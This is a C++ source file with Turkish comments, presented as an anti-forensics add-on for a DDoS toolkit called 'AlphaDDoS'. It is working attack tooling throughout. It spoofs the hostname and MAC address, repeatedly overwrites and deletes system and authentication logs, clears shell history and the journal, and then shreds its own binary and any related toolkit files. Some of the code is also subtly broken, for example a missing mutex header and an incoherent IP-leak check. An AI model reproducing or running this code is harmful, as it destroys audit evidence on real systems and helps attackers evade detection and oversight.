/*
 * Zeta Oblivion Daemon - C++ Gizlilik ve Anonimlik Katmanı
 * AlphaDDoS Ek Modülü - Sürüm 1.0
 * Zeta Protokolü Uyumlu - Tamamen Bağımsız Çalışır
 * 
 * Derleme: g++ -std=c++17 -O2 -pthread -o zeta_oblivion_daemon zeta_oblivion_daemon.cpp -lcrypto -lssl
 */

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>

// ============================================================
// KONFIGÜRASYON
// ============================================================

#define OBLIVION_SESSION_LIFETIME 180    // saniye (3 dakika)
#define KEY_ROTATION_INTERVAL 30         // saniye
#define LOG_PURGE_INTERVAL 15            // saniye
#define SELF_DESTRUCT_DELAY 600          // saniye (10 dakika)
#define BUFFER_SIZE 4096
#define MAC_ADDR_LEN 17
#define HOSTNAME_MAX 64

// ============================================================
// BÖLÜM 1: SİSTEM DÜZEYİ GİZLİLİK FONKSİYONLARI
// ============================================================

class SystemObfuscator {
private:
    std::string original_hostname;
    std::string original_mac;
    std::string current_hostname;
    std::string current_mac;
    bool active;

public:
    SystemObfuscator() : active(false) {
        this->original_hostname = this->get_hostname();
        this->original_mac = this->get_mac_address();
    }

    std::string get_hostname() {
        char buffer[HOSTNAME_MAX];
        gethostname(buffer, HOSTNAME_MAX);
        return std::string(buffer);
    }

    std::string get_mac_address() {
        struct ifreq ifr;
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return "00:00:00:00:00:00";
        
        strcpy(ifr.ifr_name, "eth0");
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
            close(sock);
            return "00:00:00:00:00:00";
        }
        close(sock);
        
        unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
        char mac_str[MAC_ADDR_LEN];
        snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        return std::string(mac_str);
    }

    std::string generate_random_mac() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        char mac[18];
        snprintf(mac, sizeof(mac), "02:%02x:%02x:%02x:%02x:%02x:%02x",
                 dis(gen), dis(gen), dis(gen), dis(gen), dis(gen), dis(gen));
        return std::string(mac);
    }

    std::string generate_random_hostname() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        const char* hex = "0123456789abcdef";
        
        std::string hostname = "zeta-";
        for (int i = 0; i < 12; i++) {
            hostname += hex[dis(gen)];
        }
        return hostname;
    }

    void apply_obfuscation() {
        // Hostname değiştir
        std::string new_hostname = this->generate_random_hostname();
        std::string cmd = "hostname " + new_hostname;
        system(cmd.c_str());
        cmd = "echo '" + new_hostname + "' > /etc/hostname";
        system(cmd.c_str());
        this->current_hostname = new_hostname;

        // MAC adresini değiştir
        std::string new_mac = this->generate_random_mac();
        cmd = "ifconfig eth0 down";
        system(cmd.c_str());
        cmd = "ifconfig eth0 hw ether " + new_mac;
        system(cmd.c_str());
        cmd = "ifconfig eth0 up";
        system(cmd.c_str());
        this->current_mac = new_mac;

        // DHCP yenile
        system("dhclient -r eth0 2>/dev/null");
        system("dhclient eth0 2>/dev/null");

        this->active = true;
        
        std::cout << "[Oblivion] Sistem obfuskasyonu uygulandi. Yeni hostname: " 
                  << new_hostname << ", Yeni MAC: " << new_mac << std::endl;
    }

    void restore_original() {
        if (!this->active) return;
        
        std::string cmd = "hostname " + this->original_hostname;
        system(cmd.c_str());
        cmd = "echo '" + this->original_hostname + "' > /etc/hostname";
        system(cmd.c_str());
        
        cmd = "ifconfig eth0 hw ether " + this->original_mac;
        system(cmd.c_str());
        
        system("dhclient -r eth0 2>/dev/null");
        system("dhclient eth0 2>/dev/null");
        
        this->active = false;
        std::cout << "[Oblivion] Orijinal kimlik geri yüklendi." << std::endl;
    }

    bool is_active() { return this->active; }
};

// ============================================================
// BÖLÜM 2: UÇTAN UCA ŞİFRELEME (OPENSSL)
// ============================================================

class EphemeralCrypto {
private:
    unsigned char session_key[32];
    unsigned char iv[16];
    bool key_valid;
    time_t key_creation_time;
    std::mutex crypto_mutex;

    void generate_session_key() {
        RAND_bytes(this->session_key, 32);
        RAND_bytes(this->iv, 16);
        this->key_creation_time = time(nullptr);
        this->key_valid = true;
    }

public:
    EphemeralCrypto() : key_valid(false), key_creation_time(0) {
        this->generate_session_key();
    }

    void rotate_key() {
        std::lock_guard<std::mutex> lock(this->crypto_mutex);
        // Eski anahtarı bellekten sil
        memset(this->session_key, 0, 32);
        memset(this->iv, 0, 16);
        this->generate_session_key();
        std::cout << "[Oblivion] Kriptografik anahtar döndürüldü." << std::endl;
    }

    std::vector<unsigned char> encrypt(const unsigned char* plaintext, size_t len) {
        std::lock_guard<std::mutex> lock(this->crypto_mutex);
        
        if (!this->key_valid) {
            throw std::runtime_error("Anahtar geçerli degil");
        }

        // Anahtar yaşam süresi kontrolü
        if (time(nullptr) - this->key_creation_time > OBLIVION_SESSION_LIFETIME) {
            this->rotate_key();
        }

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) throw std::runtime_error("Cipher context olusturulamadi");

        std::vector<unsigned char> ciphertext(len + 16 + EVP_MAX_BLOCK_LENGTH);
        int out_len = 0, total_len = 0;

        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, this->session_key, this->iv);
        EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len, plaintext, len);
        total_len += out_len;
        EVP_EncryptFinal_ex(ctx, ciphertext.data() + total_len, &out_len);
        total_len += out_len;

        ciphertext.resize(total_len);
        EVP_CIPHER_CTX_free(ctx);

        return ciphertext;
    }

    std::vector<unsigned char> decrypt(const unsigned char* ciphertext, size_t len) {
        std::lock_guard<std::mutex> lock(this->crypto_mutex);
        
        if (!this->key_valid) {
            throw std::runtime_error("Anahtar geçerli degil");
        }

        if (time(nullptr) - this->key_creation_time > OBLIVION_SESSION_LIFETIME) {
            this->rotate_key();
        }

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) throw std::runtime_error("Cipher context olusturulamadi");

        std::vector<unsigned char> plaintext(len + 16);
        int out_len = 0, total_len = 0;

        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, this->session_key, this->iv);
        EVP_DecryptUpdate(ctx, plaintext.data(), &out_len, ciphertext, len);
        total_len += out_len;
        EVP_DecryptFinal_ex(ctx, plaintext.data() + total_len, &out_len);
        total_len += out_len;

        plaintext.resize(total_len);
        EVP_CIPHER_CTX_free(ctx);

        return plaintext;
    }

    void self_destruct() {
        std::lock_guard<std::mutex> lock(this->crypto_mutex);
        memset(this->session_key, 0, 32);
        memset(this->iv, 0, 16);
        this->key_valid = false;
        this->key_creation_time = 0;
        std::cout << "[Oblivion] Kriptografik materyaller imha edildi." << std::endl;
    }

    bool is_key_valid() { return this->key_valid; }
};

// ============================================================
// BÖLÜM 3: LOG TEMİZLEME VE İZ İMHA
// ============================================================

class LogPurgeEngine {
private:
    std::vector<std::string> log_paths;
    bool active;

    void purge_single_log(const std::string& path) {
        if (access(path.c_str(), F_OK) != 0) return;
        
        // Dosyayı aç ve üzerine rastgele veri yaz
        int fd = open(path.c_str(), O_WRONLY | O_TRUNC);
        if (fd < 0) return;
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        char buffer[BUFFER_SIZE];
        for (int i = 0; i < 10; i++) {
            for (int j = 0; j < BUFFER_SIZE; j++) {
                buffer[j] = (char)dis(gen);
            }
            write(fd, buffer, BUFFER_SIZE);
            fsync(fd);
        }
        close(fd);
        
        // Dosyayı sil
        unlink(path.c_str());
    }

public:
    LogPurgeEngine() : active(false) {
        this->log_paths = {
            "/var/log/syslog",
            "/var/log/auth.log",
            "/var/log/kern.log",
            "/var/log/ufw.log",
            "/var/log/nginx/access.log",
            "/var/log/apache2/access.log",
            "/var/log/messages",
            "/var/log/btmp",
            "/var/log/wtmp",
            "/var/log/lastlog",
            "/var/log/faillog"
        };
    }

    void purge_all() {
        for (const auto& path : this->log_paths) {
            this->purge_single_log(path);
        }
        
        // Kabuk geçmişi
        system("history -c 2>/dev/null");
        system("cat /dev/null > ~/.bash_history 2>/dev/null");
        system("cat /dev/null > ~/.zsh_history 2>/dev/null");
        
        // Journal temizliği
        system("journalctl --rotate 2>/dev/null");
        system("journalctl --vacuum-time=1s 2>/dev/null");
        
        // Önbellek temizliği
        system("sync");
        system("echo 3 > /proc/sys/vm/drop_caches 2>/dev/null");
        
        std::cout << "[Oblivion] Tum loglar ve izler temizlendi." << std::endl;
    }

    void start_periodic_purge() {
        this->active = true;
        std::thread([this]() {
            while (this->active) {
                this->purge_all();
                std::this_thread::sleep_for(std::chrono::seconds(LOG_PURGE_INTERVAL));
            }
        }).detach();
    }

    void stop() {
        this->active = false;
    }
};

// ============================================================
// BÖLÜM 4: KENDİ KENDİNİ İMHA
// ============================================================

class SelfDestructMechanism {
private:
    int delay;
    bool triggered;

    void wipe_memory() {
        // Bellek temizliği - malloc'lanmış alanları sıfırla
        mallopt(M_MMAP_MAX, 0);
        mallopt(M_TRIM_THRESHOLD, -1);
    }

    void wipe_self() {
        // Çalışan dosyayı imha et
        char buffer[1024];
        ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
        if (len != -1) {
            buffer[len] = '\0';
            std::string self_path = std::string(buffer);
            
            // Dosyanın üzerine yaz
            std::ofstream file(self_path, std::ios::binary | std::ios::trunc);
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(0, 255);
            
            for (int i = 0; i < 1024 * 1024; i++) {
                file << (char)dis(gen);
            }
            file.close();
            
            // Dosyayı sil
            unlink(self_path.c_str());
        }
    }

    void wipe_directory() {
        // Mevcut çalışma dizinindeki tüm ilgili dosyaları imha et
        DIR* dir = opendir(".");
        if (dir) {
            struct dirent* entry;
            while ((entry = readdir(dir)) != nullptr) {
                std::string name = entry->d_name;
                if (name.find("zeta_") != std::string::npos ||
                    name.find("alpha") != std::string::npos ||
                    name.find("ddos") != std::string::npos) {
                    if (entry->d_type == DT_REG) {
                        // Dosya üzerine yaz ve sil
                        std::ofstream file(name, std::ios::binary | std::ios::trunc);
                        for (int i = 0; i < 1024 * 10; i++) {
                            file << (char)0x00;
                        }
                        file.close();
                        unlink(name.c_str());
                    }
                }
            }
            closedir(dir);
        }
    }

public:
    SelfDestructMechanism(int delay_seconds = SELF_DESTRUCT_DELAY) 
        : delay(delay_seconds), triggered(false) {}

    void trigger() {
        if (this->triggered) return;
        this->triggered = true;
        
        std::cout << "[Oblivion] Kendini imha mekanizmasi tetiklendi. " 
                  << this->delay << " saniye sonra tum izler silinecek." << std::endl;
        
        std::this_thread::sleep_for(std::chrono::seconds(this->delay));
        
        // 1. Bellek temizle
        this->wipe_memory();
        
        // 2. Tüm ilgili dosyaları imha et
        this->wipe_directory();
        
        // 3. Kendini imha et
        this->wipe_self();
        
        // 4. Son temizlik
        system("sync");
        
        std::cout << "[Oblivion] Kendini imha tamamlandi. Program sonlandiriliyor." << std::endl;
        exit(0);
    }

    void abort() {
        this->triggered = false;
        std::cout << "[Oblivion] Kendini imha iptal edildi." << std::endl;
    }
};

// ============================================================
// BÖLÜM 5: ANA KONTROLÖR
// ============================================================

class OblivionDaemon {
private:
    SystemObfuscator* obfuscator;
    EphemeralCrypto* crypto;
    LogPurgeEngine* purge_engine;
    SelfDestructMechanism* destructor;
    bool active;
    std::thread* key_rotation_thread;
    std::thread* daemon_thread;

    void key_rotation_loop() {
        while (this->active) {
            std::this_thread::sleep_for(std::chrono::seconds(KEY_ROTATION_INTERVAL));
            if (this->active && this->crypto) {
                this->crypto->rotate_key();
            }
        }
    }

    void daemon_loop() {
        // Periyodik log temizleme
        this->purge_engine->start_periodic_purge();
        
        // Ana döngü - arka planda çalışır
        while (this->active) {
            std::this_thread::sleep_for(std::chrono::seconds(60));
            
            // Dış IP kontrolü (sızıntı tespiti)
            char buffer[128];
            FILE* fp = popen("curl -s ifconfig.me 2>/dev/null", "r");
            if (fp) {
                if (fgets(buffer, sizeof(buffer), fp) != nullptr) {
                    std::string current_ip = std::string(buffer);
                    current_ip.erase(current_ip.find_last_not_of(" \n\r\t") + 1);
                    
                    // Eğer relay IP değilse ağı yeniden başlat
                    if (current_ip.find("relay") == std::string::npos &&
                        current_ip.find("zeta") == std::string::npos) {
                        system("systemctl restart networking 2>/dev/null");
                    }
                }
                pclose(fp);
            }
        }
    }

public:
    OblivionDaemon() {
        this->obfuscator = new SystemObfuscator();
        this->crypto = new EphemeralCrypto();
        this->purge_engine = new LogPurgeEngine();
        this->destructor = new SelfDestructMechanism();
        this->active = false;
        this->key_rotation_thread = nullptr;
        this->daemon_thread = nullptr;
    }

    ~OblivionDaemon() {
        delete this->obfuscator;
        delete this->crypto;
        delete this->purge_engine;
        delete this->destructor;
    }

    void start() {
        if (this->active) return;
        
        std::cout << "[Oblivion] Zeta Oblivion Daemon baslatiliyor..." << std::endl;
        
        // 1. Sistem obfuskasyonu
        this->obfuscator->apply_obfuscation();
        
        // 2. Anahtar rotasyonu için thread
        this->active = true;
        this->key_rotation_thread = new std::thread(&OblivionDaemon::key_rotation_loop, this);
        
        // 3. Ana daemon thread
        this->daemon_thread = new std::thread(&OblivionDaemon::daemon_loop, this);
        
        // 4. Kendini imha mekanizmasını başlat
        std::thread([this]() {
            this->destructor->trigger();
        }).detach();
        
        std::cout << "[Oblivion] Daemon aktif. Tum izler gizleniyor." << std::endl;
    }

    void stop() {
        this->active = false;
        
        if (this->key_rotation_thread) {
            this->key_rotation_thread->join();
            delete this->key_rotation_thread;
            this->key_rotation_thread = nullptr;
        }
        
        if (this->daemon_thread) {
            this->daemon_thread->join();
            delete this->daemon_thread;
            this->daemon_thread = nullptr;
        }
        
        this->purge_engine->stop();
        this->obfuscator->restore_original();
        this->crypto->self_destruct();
        this->destructor->abort();
        
        std::cout << "[Oblivion] Daemon durduruldu." << std::endl;
    }

    // Harici çağrılar için metodlar
    std::vector<unsigned char> encrypt_data(const unsigned char* data, size_t len) {
        return this->crypto->encrypt(data, len);
    }

    std::vector<unsigned char> decrypt_data(const unsigned char* data, size_t len) {
        return this->crypto->decrypt(data, len);
    }

    void purge_all_traces() {
        this->purge_engine->purge_all();
    }

    bool is_active() { return this->active; }
};

// ============================================================
// YÜRÜTÜCÜ
// ============================================================

int main(int argc, char* argv[]) {
    // Sinyal yakalama (SIGINT, SIGTERM)
    signal(SIGINT, [](int) { 
        std::cout << "\n[Oblivion] SIGINT alindi. Cikis yapiliyor..." << std::endl;
        exit(0);
    });
    signal(SIGTERM, [](int) { 
        std::cout << "\n[Oblivion] SIGTERM alindi. Cikis yapiliyor..." << std::endl;
        exit(0);
    });

    std::cout << "========================================" << std::endl;
    std::cout << "ZETA OBLIVION DAEMON v1.0" << std::endl;
    std::cout << "Uctan Uca Gizlilik ve Anonimlik Katmani" << std::endl;
    std::cout << "========================================" << std::endl;

    OblivionDaemon daemon;
    
    if (argc > 1) {
        std::string arg = std::string(argv[1]);
        if (arg == "--stop" || arg == "-s") {
            std::cout << "[Oblivion] Durdurma komutu alindi." << std::endl;
            daemon.stop();
            return 0;
        } else if (arg == "--purge" || arg == "-p") {
            std::cout << "[Oblivion] Temizlik komutu alindi." << std::endl;
            daemon.purge_all_traces();
            return 0;
        } else if (arg == "--help" || arg == "-h") {
            std::cout << "Kullanim: " << std::endl;
            std::cout << "  ./zeta_oblivion_daemon        - Baslat" << std::endl;
            std::cout << "  ./zeta_oblivion_daemon --stop - Durdur" << std::endl;
            std::cout << "  ./zeta_oblivion_daemon --purge - Tum izleri temizle" << std::endl;
            return 0;
        }
    }

    // Normal başlangıç
    daemon.start();
    
    // Sonsuz döngü - daemon arka planda çalışır
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(3600));
    }

    return 0;
}
